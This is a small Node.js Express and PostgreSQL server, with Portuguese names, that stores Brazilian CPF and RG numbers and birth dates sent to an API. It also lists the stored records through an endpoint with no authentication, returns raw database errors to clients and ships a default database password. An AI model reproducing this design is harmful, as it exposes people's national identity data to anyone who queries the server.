const express = require('express');
const { Client } = require('pg');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(express.static('public'));

const client = new Client({
        connectionString: process.env.DATABASE_URL || 'postgresql://user:password@localhost/tdrive'
});

client.connect().catch(err => console.error('Erro DB:', err.message));

async function salvarFicha(cpf, rg, data) {
        try {
                  const query = `
                        INSERT INTO fichas (cpf, rg, data_nascimento, criada_em)
                              VALUES ($1, $2, $3, NOW())
                                    RETURNING id, cpf, criada_em
                                        `;
                  const result = await client.query(query, [cpf, rg, data]);
                  return result.rows[0];
        } catch (error) {
                  if (error.code === '42P01') {
                              await criarTabela();
                              return await salvarFicha(cpf, rg, data);
                  }
                  throw error;
        }
}

async function criarTabela() {
        const query = `
            CREATE TABLE IF NOT EXISTS fichas (
                  id SERIAL PRIMARY KEY,
                        cpf VARCHAR(20) NOT NULL,
                              rg VARCHAR(20) NOT NULL,
                                    data_nascimento VARCHAR(10) NOT NULL,
                                          criada_em TIMESTAMP DEFAULT NOW()
                                              )
                                                `;
        await client.query(query);
        console.log('✅ Tabela fichas criada');
}

app.post('/api/enviar', async (req, res) => {
        try {
                  const { cpf, rg, data } = req.body;

          if (!cpf || !rg || !data) {
                      return res.status(400).json({ sucesso: false, erro: 'Dados obrigatórios' });
          }

          const ficha = await salvarFicha(cpf, rg, data);

          res.json({
                      sucesso: true,
                      mensagem: '✅ Ficha salva com sucesso! ID: ' + ficha.id,
                      id: ficha.id,
                      cpf: cpf
          });
        } catch (error) {
                  console.error('Erro:', error.message);
                  res.status(500).json({ sucesso: false, erro: error.message });
        }
});

app.get('/api/fichas', async (req, res) => {
        try {
                  const result = await client.query('SELECT * FROM fichas ORDER BY criada_em DESC LIMIT 50');
                  res.json(result.rows);
        } catch (error) {
                  res.status(500).json({ erro: error.message });
        }
});

app.listen(PORT, async () => {
        console.log(`🚀 Servidor na porta ${PORT}`);
        await criarTabela();
});
